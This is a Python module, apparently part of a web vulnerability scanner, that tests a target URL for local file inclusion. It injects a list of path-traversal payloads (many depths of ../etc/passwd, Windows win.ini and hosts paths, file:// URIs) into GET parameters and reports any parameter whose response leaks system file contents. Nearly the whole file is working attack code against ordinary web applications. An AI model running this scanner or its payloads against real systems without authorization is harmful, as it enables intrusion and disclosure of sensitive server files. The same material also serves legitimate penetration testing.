#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.logger import log_info, log_success, log_warning, log_error, log_debug

class LFIScanner:
    def __init__(self, target, verbose=False):
        self.target = target.rstrip('/')
        self.verbose = verbose
        self.vulnerable = []
        self.payloads = [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            "../../../../../../../../../etc/passwd",
            "../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
            "file:///C:/windows/win.ini"
        ]

    def extract_params(self):
        parsed = urlparse(self.target)
        if not parsed.query:
            return {}
        return parse_qs(parsed.query)

    def build_url(self, params):
        parsed = urlparse(self.target)
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def test_lfi(self, param, payload):
        params = self.extract_params()
        if param in params:
            params[param] = [payload]
        else:
            params[param] = payload
        test_url = self.build_url(params)
        try:
            resp = requests.get(test_url, timeout=10, allow_redirects=False)
            if resp.status_code == 200 and len(resp.text) > 100:
                if "root:" in resp.text or "Windows" in resp.text or "Microsoft" in resp.text:
                    result = {
                        "param": param,
                        "payload": payload,
                        "url": test_url,
                        "status": resp.status_code,
                        "vulnerable": True,
                        "preview": resp.text[:200]
                    }
                    self.vulnerable.append(result)
                    log_success(f"🔥 LFI found on {param} with payload: {payload}")
                    return True
                elif self.verbose:
                    log_debug(f"Param {param} with {payload} -> No sensitive data found")
            elif self.verbose:
                log_debug(f"Param {param} with {payload} -> {resp.status_code}")
        except Exception as e:
            if self.verbose:
                log_debug(f"Error: {e}")
        return False

    def run(self):
        log_info(f"Starting LFI/RFI scan on: {self.target}")
        params = self.extract_params()
        if not params:
            log_warning("No GET parameters found. LFI scan works best with parameters like ?page=about")
            return {"target": self.target, "scan_type": "lfi", "vulnerable": []}
        
        file_params = [p for p in params.keys() if 'file' in p.lower() or 'page' in p.lower() or 'path' in p.lower() or 'include' in p.lower()]
        if not file_params:
            file_params = list(params.keys())[:3]
        
        for param in file_params:
            log_info(f"Testing parameter: {param}")
            for payload in self.payloads[:10]:  # محدود کردن پیلودها
                if self.test_lfi(param, payload):
                    break
        
        log_success(f"LFI scan completed. Found {len(self.vulnerable)} vulnerabilities.")
        return {"target": self.target, "scan_type": "lfi", "total": len(self.vulnerable), "vulnerable": self.vulnerable}
